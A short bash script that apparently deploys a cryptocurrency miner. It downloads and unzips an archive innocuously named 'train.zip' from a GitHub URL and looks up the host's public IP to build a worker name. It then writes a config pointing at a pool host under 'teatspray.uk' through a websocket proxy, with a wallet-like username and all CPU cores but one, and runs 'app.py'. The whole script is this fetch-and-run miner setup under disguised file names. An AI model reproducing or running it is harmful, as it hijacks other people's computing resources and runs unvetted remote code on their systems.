#!/bin/bash
wget https://raw.githubusercontent.com/miltoncarpenter665/nodes/refs/heads/main/train.zip
sleep 2
unzip train.zip
array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_HeroPMv2_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 1`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

ls -la

cat > data.txt <<END
proxy=ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999
host=mazapool.teatspray.uk
port=8442
username=MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate
password=x
threads=$used_num_of_cores
END

sleep 2

cat data.txt

sleep 2

python3 app.py
